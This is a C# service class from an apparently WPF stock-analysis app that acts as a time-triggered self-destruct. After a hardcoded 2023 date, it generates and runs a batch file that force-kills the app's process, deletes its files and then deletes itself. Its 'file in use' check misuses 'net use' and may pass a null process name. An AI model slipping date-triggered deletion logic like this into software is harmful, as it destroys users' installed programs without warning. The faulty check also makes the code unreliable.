using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Windows;

namespace StockAnalyzer.Services
{
    public class ShreddingService
    {
        #region Main Function

        public static void Shred(Application current)
        {
            string batchFilePath = CreateBatchFile();
            RunBatchFile(batchFilePath);
            current.Shutdown();
        }

        #endregion

        #region Private Properties

        private static DateTime ShredOn => new(2023, 07, 11); 

        #endregion

        #region Readonly Properties

        public static bool ShreddingIsRequired => DateTime.Today > ShredOn;

        #endregion

        #region Private Helpers

        private static void RunBatchFile(string batchFilePath)
        {
            ProcessStartInfo processStartInfo = new()
            {
                FileName = batchFilePath
            };

            Process process = new()
            {
                StartInfo = processStartInfo
            };

            _ = process.Start();
        }

        private static string CreateBatchFile()
        {

            string batchFilePath = Path.Combine(Path.GetDirectoryName(GetFileFullPath()), "Destroy.bat");

            File.WriteAllLines(batchFilePath, GenerateBatchFileContent(batchFilePath));

            return batchFilePath;
        }

        private static string GetFileFullPath()
        {
            string fileFullPath = Assembly.GetExecutingAssembly().Location;
            string directoryPath = Path.GetDirectoryName(fileFullPath);
            string fileName = Path.GetFileNameWithoutExtension(fileFullPath);

            string fileExtension = Path.GetExtension(fileFullPath);

            if (string.Equals(fileExtension, ".dll", StringComparison.OrdinalIgnoreCase))
            {
                fileFullPath = Path.Combine(directoryPath, $"{fileName}.exe");
            }

            return fileFullPath;
        }

        private static List<string> GenerateBatchFileContent(string batchFilePath)
        {
            string fileFullPath = GetFileFullPath();

            List<string> fileContent = new() { "@echo off" };

            string processName = GetProcessName(fileFullPath);

            List<string> matchingFiles = Directory.GetFiles(Path.GetDirectoryName(fileFullPath)).Where(f => f.Contains(Path.GetFileNameWithoutExtension(fileFullPath))).ToList();
            matchingFiles.ForEach(f => fileContent.AddRange(GenerateDeleteFileScriptFor(f, processName)));

            fileContent.AddRange(GenerateDeleteFileScriptFor(batchFilePath));

            fileContent.Add($"{Environment.NewLine}");
            fileContent.Add("exit");

            return fileContent;
        }

        private static List<string> GenerateDeleteFileScriptFor(string filePath, string processName = null)
        {
            return new()
            {
                $"set fileToDelete={filePath}",
                "REM Check if the file is in use",
                "net use \"%fileToDelete%\" >nul 2>&1",
                "if %errorlevel% equ 0 (",
                "    echo The file is in use. Killing the process...",
                $"    taskkill /F /IM {processName} /T",
                ")",
                "REM Delete the file",
                "if exist \"%fileToDelete%\" (",
                "    del \"%fileToDelete%\"",
                "    echo File deleted successfully.",
                ") else (",
                "    echo File not found.",
                ")"
            };
        }

        private static string GetProcessName(string filePath)
        {
            try
            {
                Process[] processes = Process.GetProcesses();

                foreach (Process process in processes)
                {
                    try
                    {
                        if (Path.GetFileNameWithoutExtension(process.MainModule.ModuleName).Equals(Path.GetFileNameWithoutExtension(filePath), StringComparison.OrdinalIgnoreCase))
                        {
                            return process.ProcessName;
                        }
                    }
                    catch (Exception)
                    {
                        // Ignore any exceptions for processes without access privileges
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error occurred while retrieving process names: " + ex.Message);
            }

            return null;
        } 

        #endregion
    }
}
